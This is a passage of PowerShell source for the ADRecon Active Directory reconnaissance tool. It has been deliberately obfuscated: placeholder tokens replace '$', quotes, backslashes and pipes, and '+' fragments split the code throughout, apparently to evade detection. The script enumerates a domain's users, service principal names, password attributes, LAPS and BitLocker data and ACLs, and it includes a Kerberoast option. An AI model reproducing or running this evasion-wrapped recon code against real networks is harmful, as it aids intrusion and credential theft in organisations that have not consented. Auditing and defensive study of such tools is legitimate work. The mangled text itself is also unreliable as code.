        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELADROutputDir,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELDormantTimeSpan = 90,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELPassMaxAge = 30,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELPageSize = 200,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELUseAltCreds = 5I7ELfalse
    )

    [string] 5I7ELADReconVersion = I2ajv1.24I2aj
    Write-Output I2aj[*] ADRecon 5I7ELADReconVersion by Prashant Mahajan (@prashant3535)I2aj

    If (5I7ELGenExcel)
    {
        If (!(Test-Path 5I7ELGenExcel))
        {
            Write-Output I2aj[Invoke-ADRecon] Invalid Path ... ExitingI2aj
            Return 5I7ELnull
        }
        Export-ADRExcel -ExcelPath 5I7ELGenExcel
        Return 5I7ELnull
    }

    
    5I7ELSaveVerbosePreference = 5I7ELscript:VerbosePreference
    5I7'+'ELscript:VerbosePreference = JQTOySilentlyContinueJQTOy
    Try
    {
        If ('+'5I7ELPSVersionTable.PSVersion.Major -ne 2)
        {
            5I7ELcomputer = Get-CimInstance -ClassName Win32_ComputerSystem
            5I7ELcomputerdomainrole = (5I7ELcompu'+'ter).DomainRole
        }
        Else
        {
            5I7ELcomputer = Get-WMIObject win32_computersystem
            5I7ELcomputerdomainrole = (5I7ELcomputer).DomainRole
        }
    }
    Catch
    {
        Write-Output I2aj[Invoke-ADRecon] 5I7EL(5I7EL_.Exception.Message)I2aj
    }
    If (5I7ELSaveVerbosePreference)
    {
        5I7ELscript:VerbosePreference = 5I7ELSaveVerbosePreference
        Remove-Variable SaveVerbosePreference
    }

    switch (5I7ELcomputerdomainrole)
    {
        0
        {
            [string] 5I7ELcomputerrole = I2ajStandalone WorkstationI2aj
            5I7ELEnv:ADPS_LoadDefaultDrive = 0
            5I7ELUseAltCreds = 5I7ELtrue
        }
        1 { [string] 5I7ELcomputerrole = I2ajMember WorkstationI2aj }
        2
        {
            [string] 5I7ELcomputerrole = I2ajStandalone ServerI2aj
            5I7ELUseAltCreds = 5I7ELtrue
            5I7ELEnv:ADPS_LoadDefaultDrive = 0
        }
        3 { [string] 5I7ELcomputerrole = I2ajMember ServerI2aj }
        4 { [string] 5I7ELcomputerrole = I2ajBackup Domain ControllerI2aj }
        5 { [string] 5I7ELcomputerrole = I2ajPrimary Domain ControllerI2aj }
        default { Write-Output I2ajComputer Role could not be identified.I2aj }
    }

    5I7ELRanonComputer = I2aj5I7EL(5I7ELcomputer.domain)COlhg5I7EL([Environment]::MachineName) - 5I7EL(5I7ELcomputerrole)I2aj
    Remove-Variable computer
    Remove-Variable computerdomainrole
    Remove-Variable computerrole

    
    If ((5I7ELDomainController -ne I2ajI2aj) -or (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty))
    {
        
        If ((5I7ELMethod -eq JQTOyADWSJQTOy) -and (-Not 5I7ELUseAltCreds))
        {
            5I7ELEnv:ADPS_LoadDefaultDrive = 0
        }
        5I7ELUseAltCreds = 5I7ELtrue
    }

    
    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        If (Get-Module -ListAvailable -Name ActiveDirectory)
        {
            Try
      '+'      {
                
                5I7ELSaveVerbosePreference = 5I7ELscript:VerbosePreference;
                5I7ELscript:VerbosePreference = JQTOySilentlyContinueJQTOy;
                Import-Module ActiveDirectory -WarningAction Stop -ErrorAction Stop Ok6rl Out-Null
                If (5I7ELSaveVerbosePreference)
                {
                    5I7ELscript:VerbosePreference = 5I7ELSaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
            }
            Catch
            {
                Write-Warning I2aj[Invoke-ADRecon] Error importing ActiveDirectory Module from RSAT (Remote Server Administration Tools) ... Continuing with LDAPI2aj
                5I7ELMethod = JQTOyLDAPJQTOy
                If (5I7ELSaveVerbosePreference)
                {
                    5I7ELscript:VerbosePreference = 5I7ELSaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
        }
        Else
        {
            Write-Warning I2aj[Invoke-ADRecon] ActiveDirectory Module from RSAT (Remote Server Administration Tools) is not installed ... Continuing with LDAPI2aj
            5I7ELMethod = JQTOyLDAPJQTOy
        }
    }

    
    
    5I7ELSaveDebugPreference = 5I7ELscript:DebugPreference
    5I7ELscript:DebugPreference = JQTOySilentlyContinueJQTOy
    Try
    {
        5I7ELAdvapi32 = Add-Type -MemberDefinition 5I7ELAdvapi32Def -Name I2ajAdvapi32I2aj -Namespace ADRecon -PassThru
        5I7ELKernel32 = Add-Type -MemberDefinition 5I7ELKernel32Def -Name I2ajKernel32I2aj -Namespace ADRecon -PassThru
        
        5I7ELCLR = ([System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion)[1]
        If (5I7ELMethod -eq JQTOyADWSJQTOy)
        {
            
            If (5I7ELCLR -eq I2aj4I2aj)
            {
                Add-Type -TypeDefinition 5I7EL(5I7ELADWSSource+5I7ELPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajMicrosoft.ActiveDirectory.ManagementI2aj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajSystem.DirectoryServicesI2aj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajSystem.XMLI2aj)).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition 5I7EL(5I7ELADWSSource+5I7ELPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajMicrosoft.ActiveDirectory.ManagementI2aj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajSystem.DirectoryServicesI2aj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajSystem.XMLI2aj)).Location
                )) -Language CSharpVersion3
            }
        }

        If (5I7ELMethod -eq JQTOyLDAPJQTOy)
        {
            If (5I7ELCLR -eq I2aj4I2aj)
            {
                Add-Type -TypeDefinition 5I7EL(5I7ELLDAPSource+5I7ELPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajSystem.DirectoryServicesI2aj)).Location
                    ([System.Reflection'+'.Assembly]::LoadWithPartialName(I2ajSystem.XMLI2aj)).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition 5I7EL(5I7ELLDAPSource+5I7ELPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName('+'I2ajSystem.DirectoryServicesI2aj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(I2ajSystem.XMLI2aj)).Location
                )) -Language CSharpVersion3
            }
        }
    }
    Catch
    {
        Write-Output I2aj[Invoke-ADRecon] 5I7EL(5I7EL_.Exception.Message)I2aj
        Return 5I7ELnull
    }
    If (5I7ELSaveDebugPreference)
    {
        5I7ELscript:DebugPreference = 5I7ELSaveDebugPreference
        Remove-Variable SaveDebugPreference
    }

    
    
    If ((5I7ELMethod -eq JQTOyLDAPJQTOy) -and (5I7ELUseAltCreds) -and (5I7ELDomainController -eq I2ajI2aj) -and (5I7ELCredential -eq [Management.Automation.PSCredential]::Empty))
    {
        Try
        {
            5I7ELobjDomain = [ADSI]I2ajI2aj
            If(!(5I7ELobjDomain.name))
            {
                Write-Verbose I2aj[Invoke-ADRecon] RUNAS Check, LDAP bind UnsuccessfulI2aj
            }
            5I7ELUseAltCreds = 5I7ELfalse
            5I7ELobjDomain.Dispose()
        }
        Catch
        {
            5I7ELUseAltCreds = 5I7ELtrue
        }
    }

    If (5I7ELUseAltCreds -and ((5I7ELDomainController -eq I2ajI2aj) -or (5I7ELCredential -eq [Management.Automation.PSCredential]::Empty)))
    {

        If ((5I7ELDomainController -ne I2ajI2aj) -and (5I7ELCredential -eq [Management.Automation.PSCredential]::Empty))
        {
            Try
            {
                5I7ELCredential = Get-Credential
            }
            Catch
            {
                Write-Output I2aj[Invoke-ADRecon] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
        }
        Else
        {
            Write-Output I2ajRun Get-Help .COlhgADRecon.ps1 -Examples for additional information.I2aj
            Write-Output I2aj[Invoke-ADRecon] Use the -DomainController and -Credential parameter.I2ajFKhAJn
            Return 5I7ELnull
        }
    }

    Write-Output I2aj[*] Running on 5I7ELRanonComputerI2aj

    Switch (5I7ELCollect)
    {
        JQTOyForestJQTOy { 5I7ELADRForest = 5I7ELtrue }
        JQTOyDomainJQTOy {5I7ELADRDomain = 5I7ELtrue }
        JQTOyTrustsJQTOy { 5I7ELADRTrust = 5I7ELtrue }
        JQTOySitesJQTOy { 5I7ELADRSite = 5I7ELtrue }
        JQTOySubnetsJQTOy { 5I7ELADRSubnet = 5I7ELtrue }
        JQTOySchemaHistoryJQTOy { 5I7ELADRSchemaHistory = 5I7ELtrue }
        JQTOyPasswordPolicyJQTOy { 5I7ELADRPasswordPolicy = 5I7ELtrue }
        JQTOyFineGrainedPasswordPolicyJQTOy { 5I7ELADRFineGrainedPasswordPolicy = 5I7ELtrue }
        JQTOyDomainControllersJQTOy { 5I7ELADRDomainControllers = 5I7ELtrue }
        JQTOyUsersJQTOy { 5I7ELADRUsers = 5I7ELtrue }
        JQTOyUserSPNsJQTOy { 5I7ELADRUserSPNs = 5I7ELtrue }
        JQTOyPasswordAttributesJQTOy { 5I7ELADRPasswordAttributes = 5I7ELtrue }
        JQTOyGroupsJQTOy {5I7ELADRGroups = 5I7ELtrue }
        JQTOyGroupChangesJQTOy { 5I7ELADRGroupChanges = 5I7ELtrue }
        JQTOyGroupMembersJQTOy { 5I7ELADRGroupMembers = 5I7ELtrue }
        JQTOyOUsJQTOy { 5I7ELADROUs = 5I7ELtrue }
        JQTOyGPOsJQTOy { 5I7ELADRGPOs = 5I7ELtrue }
        JQTOygPLinksJQTOy { 5I7ELADRgPLinks = 5I7ELtrue }
        JQTOyDNSZonesJQTOy { 5I7ELADRDNSZones = 5I7ELtrue }
        JQTOyDNSRecordsJQTOy { 5I7ELADRDNSRecords = 5I7ELtrue }
        JQTOyPrintersJQTOy { 5I7ELADRPrinters = 5I7ELtrue }
        JQTOyComputersJQTOy { 5I7ELADRComputers = 5I7ELtrue }
        JQTOyComputerSPNsJQTOy { 5I7ELADRComputerSPNs = 5I7ELtrue }
        JQTOyLAPSJQTOy { 5I7ELADRLAPS = 5I7ELtrue }
        JQTOyBitLockerJQTOy { 5I7ELADRBitLocker = 5I7ELtrue }
        JQTOyACLsJQTOy { 5I7ELADRACLs = 5I7ELtrue }
        JQTOyGPOReportJQTOy
        {
            5I7ELADRGPOReport = 5I7ELtrue
            5I7ELADRCreate = 5I7ELtrue
        }
        JQTOyKerberoastJQTOy { 5I7ELADRKerberoast = 5I7ELtrue }
        JQTOyDomainAccountsusedforServiceLogonJQTOy { 5I7ELADRDomainAccountsusedforServiceLogon = 5I7ELtrue }
        JQTOyDefaultJQTOy
        {
            5I7ELADRForest = 5I7ELtrue
            5I7ELADRDomain = 5I7ELtrue
            5I7ELADRTrust = 5I7ELtrue
            5I7ELADRSite = 5I7ELtrue
            5I7ELADRSubnet = 5I7ELtrue
            5I7ELADRSchemaHistory = 5I7ELtrue
            5I7ELADRPasswordPolicy = 5I7ELtrue
            5I7ELADRFineGrainedPasswordPolicy = 5I7ELtrue
            5I7ELADRDomainControllers = 5I7ELtrue
            5I7ELADRUsers = 5I7ELtrue
            5I7ELADRUserSPNs = 5I7ELtrue
            5I7ELADRPasswordAttributes = 5I7ELtrue
            5I7ELADRGroups = 5I7ELtrue
            5I7ELADRGroupMembers = 5I7ELtrue
            5I7ELADRGroupChanges = 5I7ELtrue
            5I7ELADROUs = 5I7ELtrue
            5I7ELADRGPOs = 5I7ELtrue
            5I7ELADRgPLinks = 5I7ELtrue
            5I7ELADRDNSZones = 5I7ELtrue
            5I7ELADRDNSRecords = 5I7ELtrue
            5I7ELADRPrinters = 5I7ELtrue
            5I7ELADRComputers = 5I7ELtrue
            5I7ELADRComputerSPNs = 5I7ELtrue
 '+'           5I7ELADRLAPS = 5I7ELtrue
            5I7ELADRBitLocker = 5I7ELtrue
            
            5I7ELADRGPOReport = 5I7ELtrue
            
            

            If (5I7ELOutputType -eq I2ajDefaultI2aj)
            {
                [array] 5I7ELOutputType = I2ajCSVI2aj,I2ajExcelI2aj
            }
        }
    }

    Switch (5I7ELOutputType)
    {
        JQTOySTDOUTJQTOy { 5I7ELADRSTDOUT = 5I7ELtrue }
        JQTOyCSVJQTOy
        {
            5I7ELADRCSV = 5I7ELtrue
            5I7ELADRCreate = 5I7ELtrue
        }
        JQTOyXMLJQTOy
        {
            5I7ELADRXML = 5I7ELtrue
            5I7ELADRCreate = 5I7ELtrue
        }
        JQTOyJSONJQTOy
        {
            5I7ELADRJSON = 5I7ELtrue
            5I7ELADRCreate = 5I7ELtrue
        }
        JQTOyHTMLJQTOy
        {
            5I7ELADRHTML = 5I7ELtrue
            5I7ELADRCreate = 5I7ELtrue
        }
        JQTOyExcelJQTOy
        {
            5I7ELADRExcel = 5I7ELtrue
            5I7ELADRCreate = 5I7ELtrue
        }
        JQTOyAllJQTOy
        {
            
            5I7ELADRCSV = 5I7ELtrue
            5I7ELADRXML = 5I7ELtrue
            5I7ELADRJSON = 5I7ELtrue
            5I7ELADRHTML = 5I7ELtrue
            5I7ELADRExcel = 5I7ELtrue
            5I7ELADRCreate = 5I7ELtrue
            [array] 5I7ELOutputType = I2ajCSVI2aj,I2ajXMLI2aj,I2ajJSONI2aj,I2ajHTMLI2aj,I2ajExcelI2aj
        }
        JQTOyDefaultJQTOy
        {
            [ar'+'ray] 5I7ELOutputType = I2ajSTDOUTI2aj
            5I7ELADRSTDOUT = 5I7ELtrue
        }
    }

    If ( (5I7ELADRExcel) -and (-Not 5I7ELADRCSV) )
    {
        5I7ELADRCSV = 5I7ELtrue
        [array] 5I7ELOutputType += I2ajCSVI2aj
    }

    5I7ELreturndir = Get-Location
    5I7ELdate = Get-Date

    
    If ( (5I7ELADROutputDir) -and (5I7ELADRCreate) )
    {
        If (!(Test-Path 5I7ELADROutputDir))
        {
            New-Item 5I7ELADROutputDir -type directory Ok6rl Out-Null
            If (!(Test-Path 5I7ELADROutputDir))
            {
                Write-Output I2aj[Invoke-ADRecon] Error, invalid OutputDir Path ... ExitingI2aj
'+'                Return 5I7ELnull
            }
        }
        5I7ELADROutputDir = 5I7EL((Convert-Path 5I7ELADROutputDir).TrimEnd(I2ajCOlhgI2aj))
        Write-Verbose I2aj[*] Output Directory: 5I7ELADROutputDirI2aj
    }
    ElseIf (5I7ELADRCreate)
    {
        5I7ELADROutputDir =  -join(5I7ELreturndir,JQTOyCOlhgJQTOy,JQTOyADRecon-Report-JQTOy,5I7EL(Get-Date -UFormat %Y%m%d%H%M%S))
        New-Item 5I7ELADROutputDir -type directory Ok6rl Out-Null
        If (!(Test-Path 5I7ELADROutputDir))
        {
            Write-Output I2aj[Invoke-ADRecon] Error, could not create output directoryI2aj
            Return 5I7ELnull
        }
        5I7ELADROutputDir = 5I7EL((Convert-Path '+'5I7ELADROutputDir'+').TrimEnd(I2ajCOlhgI2aj))
        Remove-Variable ADRCreate
    }
    Else
    {
        5I7ELADROutputDir = 5I7ELreturndir
    }

    If (5I7ELADRCSV)
    {
        5I7ELCSVPath = [System.IO.DirectoryInfo] -join(5I7ELADROutputDir,JQTOyCOlh'+'gJQTOy,JQTOyCSV-FilesJQTOy)
        New-Item 5I7ELCSVPath -type directory Ok6rl Out-Null
        If (!(Test-Path 5I7ELCSVPath))
        {
            Write-Output I2aj[Invoke-ADRecon] Error, could not create output directoryI2aj
            Return 5I7ELnull
        }
        Remove-Variable ADRCSV
    }

    If (5I7ELADRXML)
    {
        5I7ELXMLPath = [System.IO.DirectoryInfo] -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyXML-FilesJQTOy)
        New-Item 5I7ELXMLPath -type directory Ok6rl Out-Null
        If (!(Test-Path 5I7ELXMLPath))
        {
            Write-Output I2aj[Invoke-ADRecon] Error, could not create output directoryI2aj
            Return 5I7ELnull
        }
        Remove-Variable ADRXML
    }

    If (5I7ELADRJSON)
    {
        5I7ELJSONPath = [System.IO.DirectoryInfo] -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyJSON-FilesJQTOy)
        New-Item 5I7ELJSONPath -type directory Ok6rl Out-Null
        If (!(Test-Path 5I7ELJSONPath))
        {
            Write-Output I2aj[Invoke-ADRecon] Error, could not create output directoryI2aj
            Return 5I7ELnull
        }
        Remove-Variable ADRJSON
    }

    If (5I7ELADRHTML)
    {
        5I7ELHTMLPath = [System.IO.DirectoryInfo] -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyHTML-FilesJQTOy)
        New-Item 5I7ELHTMLPath -type directory Ok6rl Out-Null
        If (!(Test-Path 5I7ELHTMLPath))
        {
            Write-Output I2aj[Invoke-ADRecon] Error, could not create output directoryI2aj
            Return 5I7ELnull
        }
        Remove-Variable ADRHTML
    }

    
    If (5I7ELUseAltCreds -and (5I7ELMethod -eq JQTOyADWSJQTOy))
    {
        If (!(Test-Path ADR:))
        {
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root I2ajI2aj -Server 5I7ELDomainController -Credential 5I7ELCredential -ErrorAction Stop Ok6rl Out-Null
            }
            Catch
            {
                Write-Output I2aj[Invoke-ADRecon] 5I7EL(5I7EL_.Exception.Message)I2aj
                If (5I7ELADROutputDir)
                {
                    Remove-EmptyADROutputDir 5I7ELADROutputDir 5I7ELOutputType
                }
                Return 5I7ELnull
      '+'      }
        }
        Else
        {
            Remove-PSDrive ADR
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root I2ajI2aj -Server 5I7ELDomainController -Credential 5I7ELCredential -ErrorAction Stop Ok6rl Out-Null
          '+'  }
            Catch
            {
                Write-Output I2aj[Invoke-ADRecon] 5I7EL(5I7EL_.Exception.Message)I2aj
                If (5I7ELADROutputDir)
                {
                    Remove-EmptyADROutputDir 5I7ELADROutputDir 5I7ELOutputType
                }
                Return 5I7ELnull
            }
        }
        Set-Location ADR:
        Write-Debug I2ajADR PSDrive CreatedI2aj
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (5I7ELUseAltCreds)
        {
            Try
            {
                5I7ELobjDomain = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                5I7ELobjDomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/RootDSEI2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
            }
            Catch
            {
                Write-Output I2aj[Invoke-ADRecon] 5I7EL(5I7EL_.Exception.Message)I2aj
                If (5I7ELADROutputDir)
                {
                    Remove-EmptyADROutputDir 5I7ELADROutputDir 5I7ELOutputType
                }
                Return 5I7ELnull
            }
            If(!(5I7ELobjDomain.name))
            {
                Write-Output I2aj[Invoke-ADRecon] LDAP bind UnsuccessfulI2aj
                If (5I7ELADROutputDir)
                {
                    Remove-EmptyADROutputDir 5I7ELADROutputDir 5I7ELOutputType
                }
                Return 5I7ELnull
            }
            Else
            {
                Write-Output I2aj[*] LDAP bind SuccessfulI2aj
            }
        }
        Else
        {
            5I7ELobjDomain = [ADSI]I2ajI2aj
            5I7ELobjDomainRootDSE = ([ADSI] I2ajLDAP://RootDSEI2aj)
            If(!(5I7ELobjDomain.name))
            {
                Write-Output I2aj[Invoke-ADRecon] LDAP bind UnsuccessfulI2aj
                If (5I7ELADROutputDir)
                {
                    Remove-EmptyADROutputDir 5I7ELADROutputDir 5I7ELOutputType
                }
                Return 5I7ELnull
            }
        }
        Write-Debug I2ajLDAP Bing SuccessfulI2aj
    }

    Write-Output I2aj[*] Commencing - 5I7ELdateI2aj
    If (5I7ELADRDomain)
    {
        Write-Output I2aj[-] DomainI2aj
        5I7ELADRObject = Get-ADRDomain -Method 5I7ELMethod -objDomain 5I7ELobjDomain -objDomainRootDSE 5I7ELobjDomainRootDSE -DomainController 5I7ELDomainController -Credential 5I7ELCredential
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajDomainI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomain
    }
    If (5I7ELADRForest)
    {
        Write-Output I2aj[-] ForestI2aj
        5I7ELADRObject = Get-ADRForest -Method 5I7ELMethod -objDomain 5I7ELobjDomain -objDomainRootDSE 5I7ELobjDomainRootDSE -DomainController 5I7ELDomainController -Credential 5I7ELCredential
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajForestI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRForest
    }
    If (5I7ELADRTrust)
    {
        Write-Output I2aj[-] TrustsI2aj
        5I7ELADRObject = Get-ADRTrust -Method 5I7ELMethod -objDomain 5I7ELobjDomain
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputT'+'ype 5I7ELOutputType -ADRModuleName I2ajTrustsI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRTrust
    }
    If (5I7ELADRSite)
    {
        Write-Output I2aj[-] SitesI2aj
        5I7ELADRObject = Get-ADRSite -Method 5I7ELMethod -objDomain 5I7ELobjDomain -objDomainRootDSE 5I7ELobjDomainRootDSE -DomainController 5I7ELDomainController -Credential 5I7ELCredential
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajSitesI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSite
    }
    If (5I7ELADRSubnet)
    {
        Write-Output I2aj[-] SubnetsI2aj
        5I7ELADRObject = Get-ADRSubnet -Method 5I7ELMethod -objDomain 5I7ELobjDomain -objDomainRootDSE 5I7ELobjDomainRootDSE -DomainController 5I7ELDomainController -Credential 5I7ELCredential
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajSubnetsI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSubnet
    }
    If (5I7ELADRSchemaHistory)
    {
        Write-Output I2aj[-] SchemaHistory - May take some timeI2aj
        5I7ELADRObject = Get-ADRSchemaHistory -Method 5I7ELMethod -objDomain 5I7ELobjDomain -objDomainRootDSE 5I7ELobjDomainRootDSE -DomainController 5I7ELDomainController -Credential 5I7ELCredential
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName'+' I2ajSchemaHistoryI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSchemaHistory
    }
    If (5I7ELADRPasswordPolicy)
    {
        Write-Output I2aj[-] Default Password PolicyI2aj
        5I7ELADRObject = Get-ADRDefaultPasswordPolicy -Method 5I7ELMethod -objDomain 5I7ELobjDomain
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajDefaultPasswordPolicyI2aj
            Remove-Variable ADRObject
        }
        Remove-Varia'+'ble ADRPasswordPolicy
    }
'+'    If (5I7ELADRFineGrainedPasswordPolicy)
    {
        Write-Output I2aj[-] Fine Grained Password Policy - May need a Privileged AccountI2aj
        5I7ELADRObject = Get-ADRFineGrainedPasswordPolicy -Method 5I7ELMethod -objDomain 5I7ELobjDomain
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajFineGrainedPasswordPolicyI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRFineGrainedPasswordPolicy
    }
    If (5I7ELADRDomainControllers)
    {
        Write-Output I2aj[-] Domain ControllersI2aj
        5I7ELADRObject = Get-ADRDomainController -Method 5I7ELMethod -objDomain 5I7ELobjDomain -Credential 5I7ELCredential
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajDomainControllersI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainControllers
    }
    If (5I7ELADRUsers -or 5I7ELADRUserSPNs)
    {
        If (!5I7ELADRUserSPNs)
        {
            Write-Output I2aj[-] Users - May take some timeI2aj
            5I7ELADRUserSPNs = 5I7ELfalse
        }
        ElseIf (!5I7ELADRUsers)
        {
            Write-Output I2aj[-] User SPNsI2aj
            5I7ELADRUsers = 5I7ELfalse
        }
        Else
        {
            Write-Output I2aj[-] Users and SPNs - May take some timeI2aj
        }
        Get-ADRUser -Method 5I7ELMethod -date 5'+'I7ELdate -objDomain 5I7ELobjDomain -DormantTimeSpan 5I7ELDormantTimeSpan -PageSize 5I7ELPageSize -Threads 5I7ELThreads -ADRUsers 5I7ELADRUsers -ADRUserSPNs 5I7ELADRUserSPNs
        Remove-Variable ADRUsers
        Remove-Variable ADRUserSPNs
    }
    If (5I7ELADRPasswordAttributes)
    {
        Write-Output I2aj[-] PasswordAttributes - ExperimentalI2aj
        5I7ELADRObject = Get-ADR'+'PasswordAttributes -Method 5I7ELMethod -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajPasswordAttributesI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordAttri'+'butes
    }
    If (5I7ELADRGroups -or 5I7ELADRGroupChanges)
    {
        If (!5I7ELADRGroupChanges)
        {
            Write-Output I2aj[-] Groups - May take some timeI2aj
            5I7ELADRGroupChanges = 5I7ELfalse
        }
        ElseIf (!5I7ELADRGroups)
        {
            Write-Output I2aj[-] Group Membership Changes - May take some timeI2aj
            5I7ELADRGroups = 5I7ELfalse
        }
        Else
        {
            Write-Output I2aj[-] Groups and Membership Changes - May take some timeI2aj
        }
        Get-ADRGroup -Method 5I7ELMethod -date 5I7ELdate -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize -Threads 5I7ELThreads -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRGroups 5I7ELADRGroups -ADRGroupChanges 5I7ELADRGroupChanges
        Remove-Variable ADRGroups
        Remove-Variable ADRGroupChanges
    }
    If (5I7ELADRGroupMembers)
    {
        Write-Output I2aj[-] Group Memberships - May take some timeI2aj

        5I7ELADRObject = Get-ADRGroupMember -Method 5I7ELMethod -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajGroupMembersI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroupMembers
    }
    If (5I7ELADROUs)
    {
        Write-Output I2aj[-] OrganizationalUnits (OUs)I2aj
        5I7ELADRObject = Get-ADROU -Method 5I7ELMethod -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajOUsI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADROUs
    }
    If (5I7ELADRGPOs)
    {
        Write-Output I2aj[-] GPOsI2aj
        5I7ELADRObject = Get-ADRGPO -Method 5I7ELMethod -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajGPOsI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable '+'ADRGPOs
    }
    If (5I7ELADRgPLinks)
    {
        Write-Output I2aj[-] gPLinks - Scope of Management (SOM)I2aj
        5I7ELADRObject = Get-ADRgPLink -Method 5I7ELMethod -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajgPLinksI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRgPLinks
    }
    If (5I7ELADRDNSZones -or 5I7ELADRDNSRecords)
    {
        If (!5I7ELADRDNSRecords)
        {
            Write-Output I2aj[-] DNS ZonesI2aj
            5I7ELADRDNSRecords = 5I7ELfalse
        }
        ElseIf (!5I7ELADRDN'+'SZones)
        {
            Write-Output I2aj[-] DNS RecordsI2aj
            5I7ELADRDNSZones = 5I7ELfalse
        }
        Else
        {
            Write-Output I2aj[-] DNS Zones and RecordsI2aj
        }
